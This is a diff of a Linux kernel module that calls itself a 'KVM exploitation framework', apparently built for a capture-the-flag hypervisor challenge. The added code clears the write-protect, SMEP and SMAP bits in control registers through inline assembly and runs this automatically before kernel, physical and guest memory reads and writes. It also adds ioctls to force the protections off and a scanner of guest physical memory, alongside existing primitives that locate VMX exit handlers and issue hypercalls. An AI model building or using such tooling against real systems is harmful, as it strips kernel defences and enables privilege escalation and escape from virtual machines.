@@ -1,14 +1,12 @@
 /*
- * KVM Probe Driver - Core Infrastructure
+ * KVM Probe Driver - Core Infrastructure v2.2
  * Builds KVM exploitation primitives step by step
  * 
- * Step 1: Symbol Operations (Complete)
- * Step 2: Memory Read Operations (Complete)
- * Step 3: Memory Write Operations (Complete)
- * Step 4: Address Conversion Operations (Complete)
- * Step 5: Hypercall Operations (Complete)
- * 
- * FEATURE: Hypercalls 100-103 run automatically after every read/write/scan
+ * FIXES:
+ * - CR register writes now use direct assembly for better control
+ * - Auto-disable security features before sensitive operations
+ * - Enhanced hypercall support with better result parsing
+ * - Guest memory mapping and gap analysis
  */
 
 #include <linux/module.h>
@@ -50,8 +48,8 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("KVM Exploitation Framework");
-MODULE_DESCRIPTION("KVM exploitation framework with auto-hypercall support");
-MODULE_VERSION("2.1");
+MODULE_DESCRIPTION("KVM exploitation framework with enhanced security bypass");
+MODULE_VERSION("2.2");
 
 /* ========================================================================
  * Global Variables
@@ -63,12 +61,15 @@ static unsigned long g_kaslr_slide = 0;
 static unsigned long g_kernel_text_base = 0;
 static bool g_kaslr_initialized = false;
 
+/* Security feature states */
+static int g_auto_disable_security = 1;  /* Auto-disable before operations */
+
 /* ========================================================================
  * IOCTL Definitions
  * ======================================================================== */
 #define IOCTL_BASE 0x4000
 
-/* Symbol operations (Step 1) */
+/* Symbol operations */
 #define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
 #define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
 #define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
@@ -76,8 +77,9 @@ static bool g_kaslr_initialized = false;
 #define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
 #define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
 #define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)
+#define IOCTL_GET_VMX_HANDLER_INFO   (IOCTL_BASE + 0x08)
 
-/* Memory read operations (Step 2) */
+/* Memory read operations */
 #define IOCTL_READ_KERNEL_MEM         (IOCTL_BASE + 0x10)
 #define IOCTL_READ_PHYSICAL_MEM       (IOCTL_BASE + 0x11)
 #define IOCTL_READ_GUEST_MEM          (IOCTL_BASE + 0x12)
@@ -88,8 +90,10 @@ static bool g_kaslr_initialized = false;
 #define IOCTL_DUMP_PAGE_TABLES        (IOCTL_BASE + 0x17)
 #define IOCTL_GET_KASLR_INFO          (IOCTL_BASE + 0x1A)
 #define IOCTL_READ_PFN_DATA           (IOCTL_BASE + 0x1C)
+#define IOCTL_MAP_GUEST_MEMORY        (IOCTL_BASE + 0x1D)
+#define IOCTL_SCAN_UNMAPPED_REGIONS   (IOCTL_BASE + 0x1E)
 
-/* Memory write operations (Step 3) */
+/* Memory write operations */
 #define IOCTL_WRITE_KERNEL_MEM        (IOCTL_BASE + 0x20)
 #define IOCTL_WRITE_PHYSICAL_MEM      (IOCTL_BASE + 0x21)
 #define IOCTL_WRITE_GUEST_MEM         (IOCTL_BASE + 0x22)
@@ -101,7 +105,7 @@ static bool g_kaslr_initialized = false;
 #define IOCTL_PATCH_BYTES             (IOCTL_BASE + 0x28)
 #define IOCTL_WRITE_PHYSICAL_PFN      (IOCTL_BASE + 0x29)
 
-/* Address conversion operations (Step 4) */
+/* Address conversion operations */
 #define IOCTL_GPA_TO_HVA              (IOCTL_BASE + 0x30)
 #define IOCTL_GFN_TO_HVA              (IOCTL_BASE + 0x31)
 #define IOCTL_GFN_TO_PFN              (IOCTL_BASE + 0x32)
@@ -119,9 +123,13 @@ static bool g_kaslr_initialized = false;
 #define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
 #define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)
 
-/* Hypercall operations (Step 5) */
+/* Hypercall operations */
 #define IOCTL_HYPERCALL               (IOCTL_BASE + 0x60)
 #define IOCTL_HYPERCALL_BATCH         (IOCTL_BASE + 0x61)
+
+/* Control operations */
+#define IOCTL_SET_AUTO_SECURITY       (IOCTL_BASE + 0x70)
+#define IOCTL_FORCE_DISABLE_SECURITY  (IOCTL_BASE + 0x71)
 
 /* ========================================================================
  * Data Structures
@@ -131,6 +139,12 @@ struct symbol_request {
     char name[MAX_SYMBOL_NAME];
     unsigned long address;
     char description[256];
+};
+
+struct vmx_handler_info {
+    char name[MAX_SYMBOL_NAME];
+    unsigned long address;
+    int exit_reason;
 };
 
 struct kernel_mem_read {
@@ -345,6 +359,14 @@ struct hypercall_batch_result {
     unsigned long ret_103;
 };
 
+struct guest_memory_map {
+    unsigned long start_gpa;
+    unsigned long end_gpa;
+    unsigned long size;
+    int num_regions;
+    unsigned long regions[64][2];  /* [start, end] pairs */
+};
+
 /* ========================================================================
  * Symbol Database
  * ======================================================================== */
@@ -377,10 +399,39 @@ static kvm_symbol_t kvm_symbols[] = {
 
 static unsigned int kvm_symbol_count = 0;
 
-static struct { const char *name; unsigned long address; } vmx_handlers[] = {
-    {"handle_exception_nmi", 0}, {"handle_io", 0}, {"handle_cr", 0},
-    {"handle_ept_violation", 0}, {"handle_ept_misconfig", 0},
-    {"handle_apic_access", 0}, {"handle_task_switch", 0}, {NULL, 0}
+static struct { 
+    const char *name; 
+    unsigned long address; 
+    int exit_reason;
+} vmx_handlers[] = {
+    {"handle_exception_nmi", 0, 0},
+    {"handle_external_interrupt", 0, 1},
+    {"handle_triple_fault", 0, 2},
+    {"handle_nmi_window", 0, 3},
+    {"handle_io", 0, 30},
+    {"handle_cr", 0, 28},
+    {"handle_dr", 0, 29},
+    {"handle_cpuid", 0, 10},
+    {"handle_rdmsr", 0, 31},
+    {"handle_wrmsr", 0, 32},
+    {"handle_interrupt_window", 0, 7},
+    {"handle_halt", 0, 12},
+    {"handle_invlpg", 0, 14},
+    {"handle_vmcall", 0, 18},
+    {"handle_vmx_instruction", 0, 19},
+    {"handle_ept_violation", 0, 48},
+    {"handle_ept_misconfig", 0, 49},
+    {"handle_pause", 0, 40},
+    {"handle_mwait", 0, 36},
+    {"handle_monitor", 0, 39},
+    {"handle_task_switch", 0, 9},
+    {"handle_apic_access", 0, 44},
+    {"handle_apic_write", 0, 56},
+    {"handle_apic_eoi_induced", 0, 45},
+    {"handle_wbinvd", 0, 54},
+    {"handle_xsetbv", 0, 55},
+    {"handle_invalid_guest_state", 0, -1},
+    {NULL, 0, -1}
 };
 
 static struct { const char *name; unsigned long address; } svm_handlers[] = {
@@ -447,8 +498,7 @@ static int init_kaslr(void)
 }
 
 /* ========================================================================
- * Hypercall Implementation - CORE FEATURE
- * Runs automatically after every read/write/scan
+ * Hypercall Implementation
  * ======================================================================== */
 
 #ifdef CONFIG_X86
@@ -464,10 +514,6 @@ static noinline unsigned long do_kvm_hypercall(unsigned long nr, unsigned long a
     return ret;
 }
 
-/*
- * Run CTF hypercalls 100-103 - called after every operation
- * Only logs if result is NOT 0 and NOT 0xffffffffffffffff
- */
 static void run_ctf_hypercalls(void)
 {
     unsigned long ret;
@@ -516,7 +562,7 @@ static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result) {
 #endif
 
 /* ========================================================================
- * x86 Control Register & MSR Functions
+ * Security Feature Control - IMPROVED
  * ======================================================================== */
 
 #ifdef CONFIG_X86
@@ -538,6 +584,74 @@ static unsigned long read_cr_register(int cr_num)
     }
 }
 
+/* Force disable write protect - more aggressive */
+static void force_disable_wp(void)
+{
+    unsigned long cr0;
+    preempt_disable();
+    barrier();
+    
+    asm volatile("mov %%cr0, %0" : "=r"(cr0));
+    cr0 &= ~(1UL << 16);  /* Clear WP bit */
+    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
+    
+    barrier();
+    preempt_enable();
+    
+    printk(KERN_INFO "%s: WP disabled (CR0 = 0x%lx)\n", DRIVER_NAME, native_read_cr0());
+}
+
+/* Force disable SMEP - more aggressive */
+static void force_disable_smep(void)
+{
+    unsigned long cr4;
+    preempt_disable();
+    barrier();
+    
+    asm volatile("mov %%cr4, %0" : "=r"(cr4));
+    cr4 &= ~(1UL << 20);  /* Clear SMEP bit */
+    asm volatile("mov %0, %%cr4" : : "r"(cr4) : "memory");
+    
+    barrier();
+    preempt_enable();
+    
+    printk(KERN_INFO "%s: SMEP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, native_read_cr4());
+}
+
+/* Force disable SMAP - more aggressive */
+static void force_disable_smap(void)
+{
+    unsigned long cr4;
+    preempt_disable();
+    barrier();
+    
+    asm volatile("mov %%cr4, %0" : "=r"(cr4));
+    cr4 &= ~(1UL << 21);  /* Clear SMAP bit */
+    asm volatile("mov %0, %%cr4" : : "r"(cr4) : "memory");
+    
+    barrier();
+    preempt_enable();
+    
+    printk(KERN_INFO "%s: SMAP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, native_read_cr4());
+}
+
+/* Disable all security features */
+static void disable_all_security(void)
+{
+    printk(KERN_INFO "%s: Disabling all security features\n", DRIVER_NAME);
+    force_disable_wp();
+    force_disable_smep();
+    force_disable_smap();
+}
+
+/* Auto-disable if enabled */
+static inline void auto_disable_security(void)
+{
+    if (g_auto_disable_security) {
+        disable_all_security();
+    }
+}
+
 static unsigned long disable_wp(void)
 {
     unsigned long cr0 = native_read_cr0();
@@ -549,7 +663,7 @@ static void restore_wp(unsigned long cr0) { native_write_cr0(cr0); }
 #endif
 
 /* ========================================================================
- * Memory Read Implementations (with auto-hypercall)
+ * Memory Read Implementations
  * ======================================================================== */
 
 static inline bool is_kernel_address(unsigned long addr) { return addr >= PAGE_OFFSET; }
@@ -558,6 +672,8 @@ static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t 
 {
     int i;
     if (!is_kernel_address(addr)) return -EINVAL;
+    
+    auto_disable_security();
     
     preempt_disable();
     barrier();
@@ -658,7 +774,7 @@ static int scan_memory_region(struct mem_region *region, struct mem_pattern *pat
     }
 
     kfree(scan_buffer);
-    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER SCAN */
+    run_ctf_hypercalls();
     return found;
 }
 
@@ -689,14 +805,14 @@ static int find_pattern_in_range(unsigned long start, unsigned long end,
             if (memcmp(scan_buffer + i, pattern, pattern_len) == 0) {
                 *found_addr = current_addr + i;
                 kfree(scan_buffer);
-                run_ctf_hypercalls();  /* AUTO HYPERCALL */
+                run_ctf_hypercalls();
                 return 0;
             }
         }
     }
 
     kfree(scan_buffer);
-    run_ctf_hypercalls();  /* AUTO HYPERCALL EVEN IF NOT FOUND */
+    run_ctf_hypercalls();
     return -ENOENT;
 }
 
@@ -745,7 +861,65 @@ static int dump_page_tables(unsigned long virt_addr, struct page_table_dump *dum
 #endif
 
 /* ========================================================================
- * Memory Write Implementations (with auto-hypercall)
+ * Guest Memory Mapping Analysis
+ * ======================================================================== */
+
+static int map_guest_memory(struct guest_memory_map *map)
+{
+    unsigned long gpa;
+    unsigned char test_byte;
+    int region_count = 0;
+    unsigned long region_start = 0;
+    int in_region = 0;
+    
+    printk(KERN_INFO "%s: Mapping guest memory regions...\n", DRIVER_NAME);
+    
+    /* Scan from 0 to 4GB in 2MB chunks */
+    for (gpa = 0; gpa < 0x100000000UL && region_count < 64; gpa += 0x200000) {
+        int ret = read_physical_memory(gpa, &test_byte, 1);
+        
+        if (ret == 0) {
+            /* Valid memory */
+            if (!in_region) {
+                region_start = gpa;
+                in_region = 1;
+            }
+        } else {
+            /* Invalid/unmapped */
+            if (in_region) {
+                map->regions[region_count][0] = region_start;
+                map->regions[region_count][1] = gpa;
+                region_count++;
+                in_region = 0;
+            }
+        }
+    }
+    
+    /* Close last region if needed */
+    if (in_region && region_count < 64) {
+        map->regions[region_count][0] = region_start;
+        map->regions[region_count][1] = gpa;
+        region_count++;
+    }
+    
+    map->num_regions = region_count;
+    if (region_count > 0) {
+        map->start_gpa = map->regions[0][0];
+        map->end_gpa = map->regions[region_count-1][1];
+        map->size = 0;
+        for (int i = 0; i < region_count; i++) {
+            map->size += map->regions[i][1] - map->regions[i][0];
+        }
+    }
+    
+    printk(KERN_INFO "%s: Found %d guest memory regions, total size: 0x%lx\n",
+           DRIVER_NAME, region_count, map->size);
+    
+    return 0;
+}
+
+/* ========================================================================
+ * Memory Write Implementations
  * ======================================================================== */
 
 static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
@@ -755,6 +929,8 @@ static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
     int i;
 
     if (!is_kernel_address(addr)) return -EINVAL;
+
+    auto_disable_security();
 
 #ifdef CONFIG_X86
     if (disable_wp_flag) orig_cr0 = disable_wp();
@@ -771,7 +947,7 @@ static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
     if (disable_wp_flag) restore_wp(orig_cr0);
 #endif
 
-    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER WRITE */
+    run_ctf_hypercalls();
     return 0;
 }
 
@@ -780,6 +956,8 @@ static int write_physical_memory(unsigned long phys_addr, const unsigned char *b
     void __iomem *mapped;
     unsigned long offset;
     size_t chunk_size, remaining = size, written = 0;
+
+    auto_disable_security();
 
     while (remaining > 0) {
         offset = phys_addr & ~PAGE_MASK;
@@ -793,7 +971,7 @@ static int write_physical_memory(unsigned long phys_addr, const unsigned char *b
         remaining -= chunk_size;
     }
 
-    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER WRITE */
+    run_ctf_hypercalls();
     return 0;
 }
 
@@ -804,6 +982,8 @@ static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *
     struct page *page;
     void *kaddr;
     size_t to_copy, written = 0;
+
+    auto_disable_security();
 
     while (written < size) {
         if (!pfn_valid(pfn)) return written > 0 ? 0 : -EINVAL;
@@ -819,7 +999,7 @@ static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *
         offset = 0;
     }
 
-    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER WRITE */
+    run_ctf_hypercalls();
     return 0;
 }
 
@@ -845,7 +1025,7 @@ static int write_msr_safe_local(u32 msr, u64 value)
                  : "=r"(err)
                  : "c"(msr), "a"(low), "d"(high), "i"(-EIO), "0"(0));
 
-    if (!err) run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER MSR WRITE */
+    if (!err) run_ctf_hypercalls();
     return err;
 }
 
@@ -853,6 +1033,8 @@ static int write_cr_register(int cr_num, unsigned long value, unsigned long mask
 {
     unsigned long current_val, new_val;
     if (mask == 0) mask = ~0UL;
+
+    auto_disable_security();
 
     switch (cr_num) {
         case 0:
@@ -874,7 +1056,7 @@ static int write_cr_register(int cr_num, unsigned long value, unsigned long mask
             return -EINVAL;
     }
 
-    run_ctf_hypercalls();  /* AUTO HYPERCALL AFTER CR WRITE */
+    run_ctf_hypercalls();
     return 0;
 }
 #endif
@@ -1213,6 +1395,18 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 
     switch (cmd) {
 
+        /* Control operations */
+        case IOCTL_SET_AUTO_SECURITY:
+            if (copy_from_user(&g_auto_disable_security, (void __user *)arg, sizeof(int)))
+                return -EFAULT;
+            printk(KERN_INFO "%s: Auto-disable security: %s\n", 
+                   DRIVER_NAME, g_auto_disable_security ? "enabled" : "disabled");
+            return 0;
+
+        case IOCTL_FORCE_DISABLE_SECURITY:
+            disable_all_security();
+            return 0;
+
         /* Symbol Operations */
         case IOCTL_LOOKUP_SYMBOL: {
             struct symbol_request req;
@@ -1270,6 +1464,24 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
         }
 
+        case IOCTL_GET_VMX_HANDLER_INFO: {
+            struct vmx_handler_info handlers[32];
+            int handler_count = 0;
+            
+            for (i = 0; vmx_handlers[i].name != NULL && handler_count < 32; i++) {
+                if (vmx_handlers[i].address) {
+                    strncpy(handlers[handler_count].name, vmx_handlers[i].name, MAX_SYMBOL_NAME - 1);
+                    handlers[handler_count].address = vmx_handlers[i].address;
+                    handlers[handler_count].exit_reason = vmx_handlers[i].exit_reason;
+                    handler_count++;
+                }
+            }
+            
+            if (copy_to_user((void __user *)arg, handlers, sizeof(struct vmx_handler_info) * handler_count))
+                return -EFAULT;
+            return handler_count;
+        }
+
         case IOCTL_GET_SVM_HANDLERS: {
             count = 0;
             for (i = 0; svm_handlers[i].name != NULL; i++) if (svm_handlers[i].address) count++;
@@ -1294,7 +1506,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return result_count;
         }
 
-        /* Memory Read Operations (WITH AUTO HYPERCALL) */
+        /* Memory Read Operations */
         case IOCTL_READ_KERNEL_MEM: {
             struct kernel_mem_read req;
             unsigned char *kbuf;
@@ -1385,6 +1597,13 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return ret;
         }
 
+        case IOCTL_MAP_GUEST_MEMORY: {
+            struct guest_memory_map map;
+            int ret = map_guest_memory(&map);
+            if (ret == 0 && copy_to_user((void __user *)arg, &map, sizeof(map))) return -EFAULT;
+            return ret;
+        }
+
 #ifdef CONFIG_X86
         case IOCTL_READ_CR_REGISTER: {
             struct { int cr_num; unsigned long value; } cr_req;
@@ -1423,7 +1642,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
         }
 
-        /* Memory Write Operations (WITH AUTO HYPERCALL) */
+        /* Memory Write Operations */
         case IOCTL_WRITE_KERNEL_MEM: {
             struct kernel_mem_write req;
             unsigned char *kbuf;
@@ -1692,7 +1911,7 @@ static struct file_operations fops = {
 /* Module Init/Exit */
 static int __init mod_init(void)
 {
-    printk(KERN_INFO "%s: Initializing v2.1 (Auto-Hypercall after R/W/Scan)\n", DRIVER_NAME);
+    printk(KERN_INFO "%s: Initializing v2.2 (Enhanced security bypass)\n", DRIVER_NAME);
     kallsyms_lookup_init();
     init_kaslr();
     init_symbol_database();
@@ -1710,7 +1929,7 @@ static int __init mod_init(void)
     driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
     if (IS_ERR(driver_device)) { class_destroy(driver_class); unregister_chrdev(major_num, DEVICE_FILE_NAME); return PTR_ERR(driver_device); }
 
-    printk(KERN_INFO "%s: /dev/%s created. HC 100-103 auto-run after ops.\n", DRIVER_NAME, DEVICE_FILE_NAME);
+    printk(KERN_INFO "%s: /dev/%s created. Auto-security bypass enabled.\n", DRIVER_NAME, DEVICE_FILE_NAME);
     return 0;
 }
 
